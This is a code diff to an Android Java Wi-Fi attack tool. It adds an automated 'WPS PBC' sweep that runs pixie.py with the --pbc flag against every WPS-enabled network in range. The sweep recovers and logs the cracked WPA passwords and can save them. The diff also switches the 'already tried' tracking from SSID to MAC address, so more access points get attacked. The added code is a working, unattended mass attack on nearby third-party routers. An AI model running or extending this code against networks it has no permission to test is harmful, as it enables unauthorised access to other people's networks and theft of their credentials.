@@ -174,6 +174,7 @@ public class Wifi extends Fragment {
         FabOption fabOption = view.findViewById(R.id.fab_pixie);
         FabOption fabOption2 = view.findViewById(R.id.fab_hs);
         FabOption fabOption3 = view.findViewById(R.id.fab_deauth);
+        FabOption fabOptionWpsPbc = view.findViewById(R.id.fab_wps_pbc);
         fabOption2.setOnClickListener(view1 -> runHS());
         if (core.getBoolean("wifi") && !core.isRootless()) {
             core.threadCommand("svc wifi enable");
@@ -183,6 +184,13 @@ public class Wifi extends Fragment {
                 runPixies(mAdapter.wifilist);
             }
         });
+        if (fabOptionWpsPbc != null) {
+            fabOptionWpsPbc.setOnClickListener(v -> {
+                if (mAdapter != null) {
+                    runWpsPbc(mAdapter.wifilist);
+                }
+            });
+        }
         fabOption3.setOnClickListener(v -> runDeauth());
         return view;
     }
@@ -732,7 +740,7 @@ public class Wifi extends Fragment {
                         }
                     }
                 }, 0, 1000);
-                if (temp.getWps() && !temp.isBlocked && !tried.contains(temp.getSsid())) {
+                if (temp.getWps() && !temp.isBlocked && !tried.contains(temp.getMac())) {
                     monitor.target(temp.getSsid(), targetMeta(temp));
                     monitor.metric(AttackMetric.TARGET, temp.getSsid());
                     monitor.stage(AttackStage.ASSOC, AttackStage.State.ACTIVE);
@@ -751,7 +759,7 @@ public class Wifi extends Fragment {
                                 }
                             }
                             total[0]++;
-                            tried.add(temp.getSsid());
+                            tried.add(temp.getMac()); // use MAC not SSID to avoid skipping same-name APs
                             monitor.metric(AttackMetric.CRACKED, totalSuccess[0]);
                             monitor.metric(AttackMetric.PROGRESS, total[0] + " / " + list.size());
                         }
@@ -797,6 +805,132 @@ public class Wifi extends Fragment {
             monitor.target("Sweep finished", list.size() + " networks queued");
             monitor.finish(totalSuccess[0] > 0,
                     "Cracked " + totalSuccess[0] + " of " + total[0] + " attacked");
+        });
+        attackThread = sweep;
+        sweep.start();
+    }
+
+    /**
+     * Auto WPS PBC (Push Button Capture) sweep – simulates a push-button event on each WPS network
+     * and waits for the router to complete the WPS handshake, recovering the PSK automatically.
+     */
+    public void runWpsPbc(ArrayList<WiFINetwork> list) {
+        if (list == null) return;
+        final AttackMonitor monitor = AttackMonitor.open(activity, core, AttackKind.MASS_PIXIE,
+                "Preparing PBC scan", list.size() + " WPS networks queued");
+        final AtomicBoolean cancelAttack = new AtomicBoolean(false);
+        final AdvancedProcess[] pbc = {null};
+        final Timer[] timer = {new Timer()};
+        final int[] totalSuccess = {0};
+        final int[] total = {0};
+        final StringBuilder crackedLog = new StringBuilder();
+
+        monitor.metric(AttackMetric.PROGRESS, "0 / " + list.size());
+        monitor.metric(AttackMetric.CRACKED, 0);
+        monitor.stage(AttackStage.RADIO, AttackStage.State.ACTIVE, "Taking the radio off Android");
+        monitor.note("Auto WPS PBC – simulating push-button on each router");
+
+        monitor.secondary("Skip this network", () -> {
+            if (pbc[0] != null) {
+                pbc[0].kill();
+                monitor.note("Skipped by request");
+            }
+        });
+
+        monitor.onStop(() -> {
+            cancelAttack.set(true);
+            if (pbc[0] != null) pbc[0].kill();
+            try { timer[0].cancel(); } catch (Exception ignored) {}
+            monitor.hideSecondary();
+            monitor.finish(totalSuccess[0] > 0,
+                    "PBC: Cracked " + totalSuccess[0] + " of " + total[0] + " attacked");
+            new Thread(() -> {
+                restoreWpsInterface();
+                if (!core.isRootless() && core.isPixieIfaceDown()
+                        && core.getHSInterface().contains("wlan0")) {
+                    core.customCommand("svc wifi enable");
+                }
+            }).start();
+        });
+
+        ArrayList<String> tried = new ArrayList<>();
+        Thread sweep = new Thread(() -> {
+            core.wpsDisableWifiIfEnabled();
+            monitor.stage(AttackStage.RADIO, AttackStage.State.DONE);
+            monitor.stage(AttackStage.SWEEP, AttackStage.State.ACTIVE);
+
+            for (WiFINetwork temp : list) {
+                if (cancelAttack.get()) break;
+                if (!temp.getWps() || temp.isBlocked || tried.contains(temp.getMac())) continue;
+
+                final int[] time = {90}; // PBC needs more time
+                try { timer[0].cancel(); } catch (Exception ignored) {}
+                timer[0] = new Timer();
+                timer[0].schedule(new TimerTask() {
+                    @Override
+                    public void run() {
+                        time[0]--;
+                        monitor.metric(AttackMetric.TIMEOUT, time[0] + "s");
+                        if (time[0] <= 0) {
+                            if (pbc[0] != null) pbc[0].kill();
+                            try { timer[0].cancel(); } catch (Exception ignored) {}
+                            monitor.note("PBC timeout – skipping " + temp.getSsid());
+                        }
+                    }
+                }, 0, 1000);
+
+                monitor.target(temp.getSsid(), targetMeta(temp));
+                monitor.metric(AttackMetric.TARGET, temp.getSsid());
+                monitor.stage(AttackStage.ASSOC, AttackStage.State.ACTIVE);
+
+                // Use --pbc flag to simulate WPS push-button event
+                String cmd = " python3 -u /CORE/PixieWps/pixie.py -i " + core.getWPSInterface()
+                        + core.wpsIfaceDownFlag() + " --pbc -b " + temp.getMac();
+                pbc[0] = new AdvancedProcess(activity, context, cmd, true) {
+                    @Override
+                    public void onFinished(ArrayList<String> outputList) {
+                        WiFINetwork result = pixieParse(outputList);
+                        if (result.getOK()) {
+                            totalSuccess[0]++;
+                            monitor.note(temp.getSsid() + " – PBC cracked: " + result.getPsk());
+                            if (core.isStoreEnabled()) {
+                                core.saveNetwork(temp.getMac(), result.getPsk(), result.getPin(), temp.ssid);
+                            }
+                            crackedLog.append("✓ ").append(temp.getSsid())
+                                    .append(": Password: ").append(result.getPsk()).append("\n");
+                            monitor.showCrackedLog(crackedLog.toString());
+                            core.vibrate(500);
+                            AttackMonitor.triggerLightningEffect(activity);
+                        }
+                        total[0]++;
+                        tried.add(temp.getMac());
+                        monitor.metric(AttackMetric.CRACKED, totalSuccess[0]);
+                        monitor.metric(AttackMetric.PROGRESS, total[0] + " / " + list.size());
+                    }
+
+                    @Override
+                    public void onNewLine(String line) {
+                        monitor.wps(maskedLine(line));
+                    }
+
+                    @Override
+                    public void onEvent(String line) {}
+                };
+                pixieProcess = pbc[0];
+                while (pbc[0].isRunning()) {
+                    try { Thread.sleep(2000); } catch (InterruptedException e) { return; }
+                }
+                restoreWpsInterface();
+            }
+
+            restoreWpsInterface();
+            try { timer[0].cancel(); } catch (Exception ignored) {}
+            monitor.hideSecondary();
+            monitor.stage(AttackStage.SWEEP, AttackStage.State.DONE,
+                    total[0] + " of " + list.size() + " tried");
+            monitor.target("PBC sweep finished", list.size() + " networks queued");
+            monitor.finish(totalSuccess[0] > 0,
+                    "PBC: Cracked " + totalSuccess[0] + " of " + total[0] + " attacked");
         });
         attackThread = sweep;
         sweep.start();
